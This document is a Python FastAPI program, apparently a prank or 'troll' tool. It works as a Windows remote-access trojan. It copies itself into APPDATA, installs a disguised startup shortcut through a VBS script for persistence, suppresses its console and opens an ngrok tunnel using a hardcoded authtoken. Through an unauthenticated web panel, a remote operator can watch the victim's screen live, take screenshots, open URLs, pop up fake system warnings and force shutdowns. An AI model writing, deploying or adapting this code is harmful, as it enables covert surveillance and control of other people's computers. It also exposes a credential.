import sys
import os

# Zorg dat Uvicorn niet crasht als er geen consolevenster (--noconsole) is
if sys.stdout is None:
    sys.stdout = open(os.devnull, "w")
if sys.stderr is None:
    sys.stderr = open(os.devnull, "w")

import ctypes
import pyttsx3
import threading
import shutil
import time
import random
import io
import pyautogui
from PIL import Image
import mss
from fastapi import FastAPI, Form
from fastapi.responses import HTMLResponse, StreamingResponse
import subprocess

pyautogui.FAILSAFE = False
app = FastAPI(title="Ultimate Troll Control Dashboard")

# --- NGROK CONFIGURATIE ---
NGROK_AUTHTOKEN = "3LR07LhwJcHR4qXzCCgHezyYSZ4_3QGQ6qrgHCQ8Wzk3vQHBt"
NGROK_STATIC_DOMAIN = "eligibly-lint-dispute.ngrok-free.dev"

def start_ngrok_tunnel():
    try:
        # Start ngrok op de achtergrond met het vaste statische domein op poort 8000
        subprocess.Popen(
            ["ngrok", "http", "8000", "--url", f"https://{NGROK_STATIC_DOMAIN}"],
            stdout=subprocess.DEVNULL,
            stderr=subprocess.DEVNULL
        )
    except Exception as e:
        pass

# --- AUTO-INSTALLER / DROPPER LOGICA ---

def setup_autostart_and_relocate():
    if getattr(sys, 'frozen', False):
        appdata = os.getenv('APPDATA')
        target_dir = os.path.join(appdata, 'SystemTrollService')
        target_exe = os.path.join(target_dir, 'server.exe')

        current_exe = sys.executable

        if os.path.abspath(current_exe).lower() != os.path.abspath(target_exe).lower():
            try:
                if not os.path.exists(target_dir):
                    os.makedirs(target_dir)

                shutil.copy2(current_exe, target_exe)

                startup_dir = os.path.join(appdata, r'Microsoft\Windows\Start Menu\Programs\Startup')
                shortcut_path = os.path.join(startup_dir, 'WindowsSystemTask.lnk')

                vbs_script = f'''
                Set WshShell = CreateObject("WScript.Shell")
                Set shortcut = WshShell.CreateShortcut("{shortcut_path}")
                shortcut.TargetPath = "{target_exe}"
                shortcut.WorkingDirectory = "{target_dir}"
                shortcut.WindowStyle = 7
                shortcut.Save
                '''
                vbs_file = os.path.join(target_dir, 'create_shortcut.vbs')
                with open(vbs_file, 'w') as f:
                    f.write(vbs_script)

                os.system(f'cscript //nologo "{vbs_file}"')
                if os.path.exists(vbs_file):
                    os.remove(vbs_file)

                os.system(f'start "" "{target_exe}"')
                sys.exit(0)
            except Exception:
                pass

# --- INTERNE FUNCTIES ---

def speak_text(text: str, gender: str):
    def target():
        engine = pyttsx3.init()
        voices = engine.getProperty('voices')
        
        selected_voice = None
        gend = gender.lower()
        
        for v in voices:
            vname = v.name.lower() if v.name else ""
            if gend == "male" and "david" in vname:
                selected_voice = v.id
                break
            elif gend == "female" and "zira" in vname:
                selected_voice = v.id
                break
                
        if not selected_voice and voices:
            if gend == "female" and len(voices) > 1:
                selected_voice = voices[1].id
            else:
                selected_voice = voices[0].id

        if selected_voice:
            engine.setProperty('voice', selected_voice)
            
        engine.say(text)
        engine.runAndWait()
    threading.Thread(target=target, daemon=True).start()

def show_popup(title: str, message: str):
    def target():
        active_window_handle = ctypes.windll.user32.GetForegroundWindow()
        ctypes.windll.user32.MessageBoxW(active_window_handle, message, title, 0x10 | 0x0 | 0x00010000)
    threading.Thread(target=target, daemon=True).start()

def shake_mouse(intensity: int, duration: float):
    def target():
        range_pixel = intensity * 10
        end_time = time.time() + duration
        while time.time() < end_time:
            x, y = pyautogui.position()
            new_x = x + random.randint(-range_pixel, range_pixel)
            new_y = y + random.randint(-range_pixel, range_pixel)
            pyautogui.moveTo(new_x, new_y, duration=0.03)
            time.sleep(0.01)
    threading.Thread(target=target, daemon=True).start()

def trigger_matrix(count: int, color_code: str, custom_text: str):
    def target():
        safe_text = custom_text.replace('"', '').replace('&', '')
        for _ in range(count):
            command = f'start cmd /k "color {color_code} && echo {safe_text} && dir /s"'
            os.system(command)
            time.sleep(0.2)
    threading.Thread(target=target, daemon=True).start()

def minimize_all():
    ctypes.windll.user32.keybd_event(0x5B, 0, 0, 0)
    ctypes.windll.user32.keybd_event(0x44, 0, 0, 0)
    ctypes.windll.user32.keybd_event(0x44, 0, 2, 0)
    ctypes.windll.user32.keybd_event(0x5B, 0, 2, 0)

def generate_live_stream():
    with mss.MSS() as sct:
        monitor = sct.monitors[1]
        while True:
            try:
                img = sct.grab(monitor)
                frame = Image.frombytes("RGB", img.size, img.bgra, "raw", "BGRX")
                frame = frame.resize((1024, int(1024 * (monitor["height"] / monitor["width"]))))
                
                buffer = io.BytesIO()
                frame.save(buffer, format="JPEG", quality=70)
                frame_bytes = buffer.getvalue()
                
                yield (b'--frame\r\n'
                       b'Content-Type: image/jpeg\r\n\r\n' + frame_bytes + b'\r\n')
                time.sleep(0.1)
            except Exception:
                break

# --- 1. DASHBOARD HTML ---
@app.get("/", response_class=HTMLResponse)
async def get_dashboard():
    return """
    <!DOCTYPE html>
    <html lang="nl">
    <head>
        <meta charset="UTF-8">
        <meta name="viewport" content="width=device-width, initial-scale=1.0">
        <title>🎛️ Control Panel Dashboard</title>
        <link href="https://fonts.googleapis.com/css2?family=Inter:wght@300;400;600;700&display=swap" rel="stylesheet">
        <style>
            :root {
                --bg-color: #0f172a;
                --card-bg: #1e293b;
                --accent-color: #6366f1;
                --accent-hover: #4f46e5;
                --text-color: #f8fafc;
                --text-muted: #94a3b8;
                --border-color: #334155;
            }
            body {
                font-family: 'Inter', sans-serif;
                background-color: var(--bg-color);
                color: var(--text-color);
                margin: 0;
                padding: 30px 15px;
            }
            .header {
                text-align: center;
                margin-bottom: 40px;
            }
            .header h1 {
                font-size: 2.2rem;
                margin-bottom: 8px;
                background: linear-gradient(135deg, #818cf8, #c084fc);
                -webkit-background-clip: text;
                -webkit-text-fill-color: transparent;
            }
            .header p {
                color: var(--text-muted);
                font-size: 0.95rem;
            }
            .container {
                display: grid;
                grid-template-columns: repeat(auto-fit, minmax(320px, 1fr));
                gap: 20px;
                max-width: 1200px;
                margin: 0 auto;
            }
            .card {
                background: var(--card-bg);
                border: 1px solid var(--border-color);
                border-radius: 12px;
                padding: 20px;
                box-shadow: 0 10px 25px -5px rgba(0, 0, 0, 0.3);
                display: flex;
                flex-direction: column;
                justify-content: space-between;
                transition: transform 0.2s, box-shadow 0.2s;
            }
            .card:hover {
                transform: translateY(-3px);
                box-shadow: 0 15px 30px -5px rgba(0, 0, 0, 0.4);
            }
            .card h3 {
                margin-top: 0;
                margin-bottom: 15px;
                font-size: 1.15rem;
                display: flex;
                align-items: center;
                gap: 8px;
            }
            .form-group {
                margin-bottom: 12px;
                text-align: left;
            }
            label {
                display: block;
                font-size: 0.85rem;
                color: var(--text-muted);
                margin-bottom: 5px;
            }
            input[type="text"], select, input[type="number"] {
                width: 100%;
                padding: 10px;
                border-radius: 6px;
                border: 1px solid var(--border-color);
                background: #0f172a;
                color: #fff;
                box-sizing: border-box;
                font-size: 0.9rem;
            }
            input[type="range"] {
                width: 100%;
            }
            .range-val {
                font-weight: bold;
                color: #818cf8;
                float: right;
            }
            button {
                background: var(--accent-color);
                color: white;
                border: none;
                padding: 12px;
                border-radius: 6px;
                font-weight: 600;
                cursor: pointer;
                width: 100%;
                margin-top: 10px;
                transition: background 0.2s;
            }
            button:hover {
                background: var(--accent-hover);
            }
            .btn-danger {
                background: #ef4444;
            }
            .btn-danger:hover {
                background: #dc2626;
            }
            .btn-warning {
                background: #f59e0b;
            }
            .btn-warning:hover {
                background: #d97706;
            }
            .media-container {
                position: relative;
                margin-top: 10px;
                background: #000;
                border-radius: 6px;
                border: 1px solid var(--border-color);
                overflow: hidden;
                display: none;
                text-align: center;
            }
            .screen-preview, .live-stream {
                width: 100%;
                max-height: 200px;
                object-fit: contain;
                display: block;
            }
            .fullscreen-btn {
                background: rgba(0, 0, 0, 0.7);
                color: white;
                border: 1px solid var(--border-color);
                padding: 5px 10px;
                font-size: 0.75rem;
                border-radius: 4px;
                cursor: pointer;
                margin: 5px;
            }
            .fullscreen-btn:hover {
                background: rgba(255, 255, 255, 0.2);
            }
        </style>
    </head>
    <body>
        <div class="header">
            <h1>🎛️ Ultimate Control Dashboard</h1>
            <p>Beheer en bestuur acties op afstand via een modern bedieningspaneel.</p>
        </div>

        <div class="container">
            <!-- Website Card -->
            <div class="card">
                <div>
                    <h3>🌐 Website Openen</h3>
                    <form action="/api/open" method="post" target="dummyframe">
                        <div class="form-group">
                            <label>URL / Link:</label>
                            <input type="text" name="url" placeholder="https://google.com" required>
                        </div>
                        <button type="submit">🚀 Openen</button>
                    </form>
                </div>
            </div>

            <!-- Speak Card -->
            <div class="card">
                <div>
                    <h3>🔊 Spraak & Stem</h3>
                    <form action="/api/speak" method="post" target="dummyframe">
                        <div class="form-group">
                            <label>Tekst:</label>
                            <input type="text" name="text" placeholder="Wat moet de pc zeggen?" required>
                        </div>
                        <div class="form-group">
                            <label>Kies Stem:</label>
                            <select name="gender">
                                <option value="female">👩 Vrouwelijk (Zira)</option>
                                <option value="male">👨 Mannelijk (David)</option>
                            </select>
                        </div>
                        <button type="submit">🗣️ Spreken</button>
                    </form>
                </div>
            </div>

            <!-- Pop-up Card -->
            <div class="card">
                <div>
                    <h3>⚠️ Pop-up Melding</h3>
                    <form action="/api/popup" method="post" target="dummyframe">
                        <div class="form-group">
                            <label>Titel:</label>
                            <input type="text" name="title" value="Systeemwaarschuwing" required>
                        </div>
                        <div class="form-group">
                            <label>Bericht:</label>
                            <input type="text" name="message" placeholder="Vul hier de boodschap in..." required>
                        </div>
                        <button type="submit">🚨 Toon Pop-up</button>
                    </form>
                </div>
            </div>

            <!-- Shake Mouse Card -->
            <div class="card">
                <div>
                    <h3>🖱️ Muis Trillen</h3>
                    <form action="/api/shake" method="post" target="dummyframe">
                        <div class="form-group">
                            <label>Heftigheid (1-10): <span id="int_val" class="range-val">5</span></label>
                            <input type="range" name="intensity" min="1" max="10" value="5" oninput="document.getElementById('int_val').innerText = this.value">
                        </div>
                        <div class="form-group">
                            <label>Tijdsduur (in seconden):</label>
                            <input type="number" name="duration" value="3" min="1" max="60" required>
                        </div>
                        <button type="submit">💫 Activeer Muis</button>
                    </form>
                </div>
            </div>

            <!-- Matrix Card -->
            <div class="card">
                <div>
                    <h3>💻 Matrix Mode</h3>
                    <form action="/api/matrix" method="post" target="dummyframe">
                        <div class="form-group">
                            <label>Aantal Schermen:</label>
                            <input type="number" name="count" value="5" min="1" max="20">
                        </div>
                        <div class="form-group">
                            <label>Kleur van Tekst:</label>
                            <select name="color_code">
                                <option value="0a">🟢 Matrix Groen</option>
                                <option value="0c">🔴 Waarschuwing Rood</option>
                                <option value="0b">🔵 Cyber Blauw</option>
                                <option value="0e">🟡 Neon Geel</option>
                                <option value="0f">⚪ Helder Wit</option>
                            </select>
                        </div>
                        <div class="form-group">
                            <label>Aangepaste Bericht:</label>
                            <input type="text" name="custom_text" value="ACCESSED SYSTEM DATA...">
                        </div>
                        <button type="submit" class="btn-danger">☠️ Start Matrix</button>
                    </form>
                </div>
            </div>

            <!-- Minimize Card -->
            <div class="card">
                <div>
                    <h3>📉 Bureaublad</h3>
                    <p style="font-size: 0.85rem; color: var(--text-muted);">Minimaliseer direct alle geopende vensters.</p>
                    <form action="/api/minimize" method="post" target="dummyframe">
                        <button type="submit">🗑️ Verberg Alles</button>
                    </form>
                </div>
            </div>

            <!-- Screenshot Card -->
            <div class="card">
                <div>
                    <h3>📸 Screenshot</h3>
                    <p style="font-size: 0.85rem; color: var(--text-muted);">Maak direct een foto van het scherm.</p>
                    <button type="button" onclick="takeScreenshot()">📷 Maak Screenshot</button>
                    <div id="screenshotContainer" class="media-container">
                        <img id="screenshotPreview" class="screen-preview" alt="Screenshot">
                        <button type="button" class="fullscreen-btn" onclick="openFullscreen('screenshotPreview')">⛶ Volledig scherm</button>
                    </div>
                </div>
            </div>

            <!-- Live Stream Card -->
            <div class="card">
                <div>
                    <h3>🎥 Live Meekijken</h3>
                    <p style="font-size: 0.85rem; color: var(--text-muted);">Start of stop de live videoweergave.</p>
                    <div style="display: flex; gap: 8px;">
                        <button type="button" onclick="startStream()" style="background: #10b981;">▶️ Start Stream</button>
                        <button type="button" onclick="stopStream()" class="btn-danger">⏹️ Stop</button>
                    </div>
                    <div id="streamContainer" class="media-container">
                        <img id="liveStreamImg" class="live-stream" alt="Live Stream gestopt">
                        <button type="button" class="fullscreen-btn" onclick="openFullscreen('liveStreamImg')">⛶ Volledig scherm</button>
                    </div>
                </div>
            </div>

            <!-- System Power Controls Card -->
            <div class="card">
                <div>
                    <h3>⚡ Systeembeheer</h3>
                    <p style="font-size: 0.85rem; color: var(--text-muted);">Herstart, sluit de PC af of stop het script.</p>
                    <div style="display: flex; flex-direction: column; gap: 8px;">
                        <form action="/api/stop_server" method="post" target="dummyframe" onsubmit="return confirm('Weet je zeker dat je de server wilt stoppen?');">
                            <button type="submit" style="background: #64748b;">🛑 Server Stoppen</button>
                        </form>
                        <form action="/api/restart_pc" method="post" target="dummyframe" onsubmit="return confirm('Weet je zeker dat je de PC wilt HERSTARTEN?');">
                            <button type="submit" class="btn-warning">🔄 PC Herstarten</button>
                        </form>
                        <form action="/api/shutdown_pc" method="post" target="dummyframe" onsubmit="return confirm('Weet je zeker dat je de PC wilt UITSCHAKELEN?');">
                            <button type="submit" class="btn-danger">⚡ PC Uitschakelen</button>
                        </form>
                    </div>
                </div>
            </div>
        </div>

        <iframe name="dummyframe" id="dummyframe" style="display:none;"></iframe>

        <script>
            function takeScreenshot() {
                fetch('/api/screenshot', { method: 'POST' })
                    .then(response => response.blob())
                    .then(blob => {
                        const url = URL.createObjectURL(blob);
                        const img = document.getElementById('screenshotPreview');
                        img.src = url;
                        document.getElementById('screenshotContainer').style.display = 'block';
                    });
            }

            function startStream() {
                const img = document.getElementById('liveStreamImg');
                img.src = '/api/stream?' + new Date().getTime();
                document.getElementById('streamContainer').style.display = 'block';
            }

            function stopStream() {
                const img = document.getElementById('liveStreamImg');
                img.src = '';
                document.getElementById('streamContainer').style.display = 'none';
            }

            function openFullscreen(elementId) {
                const elem = document.getElementById(elementId);
                if (elem.requestFullscreen) {
                    elem.requestFullscreen();
                } else if (elem.webkitRequestFullscreen) {
                    elem.webkitRequestFullscreen();
                } else if (elem.msRequestFullscreen) {
                    elem.msRequestFullscreen();
                }
            }
        </script>
    </body>
    </html>
    """

# --- 2. ENDPOINTS ---

@app.post("/api/open")
async def api_open(url: str = Form(...)):
    if not url.startswith("http://") and not url.startswith("https://"):
        url = "https://" + url
    os.system(f'start "" "{url}"')
    return {"status": "ok"}

@app.post("/api/speak")
async def api_speak(text: str = Form(...), gender: str = Form("female")):
    speak_text(text, gender)
    return {"status": "ok"}

@app.post("/api/popup")
async def api_popup(title: str = Form(...), message: str = Form(...)):
    show_popup(title, message)
    return {"status": "ok"}

@app.post("/api/shake")
async def api_shake(intensity: int = Form(...), duration: float = Form(3.0)):
    shake_mouse(intensity, duration)
    return {"status": "ok"}

@app.post("/api/matrix")
async def api_matrix(count: int = Form(5), color_code: str = Form("0a"), custom_text: str = Form("ACCESSED SYSTEM DATA...")):
    trigger_matrix(count, color_code, custom_text)
    return {"status": "ok"}

@app.post("/api/minimize")
async def api_minimize():
    minimize_all()
    return {"status": "ok"}

@app.post("/api/screenshot")
async def api_screenshot():
    with mss.MSS() as sct:
        monitor = sct.monitors[1]
        img = sct.grab(monitor)
        frame = Image.frombytes("RGB", img.size, img.bgra, "raw", "BGRX")
        
        buffer = io.BytesIO()
        frame.save(buffer, format="JPEG", quality=85)
        buffer.seek(0)
        return StreamingResponse(buffer, media_type="image/jpeg")

@app.get("/api/stream")
async def api_stream():
    return StreamingResponse(generate_live_stream(), media_type="multipart/x-mixed-replace; boundary=frame")

# --- SYSTEEM / POWER ENDPOINTS ---

@app.post("/api/stop_server")
async def api_stop_server():
    def kill():
        time.sleep(0.5)
        os._exit(0)
    threading.Thread(target=kill, daemon=True).start()
    return {"status": "Server shutting down"}

@app.post("/api/restart_pc")
async def api_restart_pc():
    os.system("shutdown /r /t 0")
    return {"status": "PC restarting"}

@app.post("/api/shutdown_pc")
async def api_shutdown_pc():
    os.system("shutdown /s /t 0")
    return {"status": "PC shutting down"}

if __name__ == "__main__":
    setup_autostart_and_relocate()

    # Start direct de Ngrok tunnel op de achtergrond via subprocess
    start_ngrok_tunnel()

    import uvicorn
    uvicorn.run(app, host="0.0.0.0", port=8000)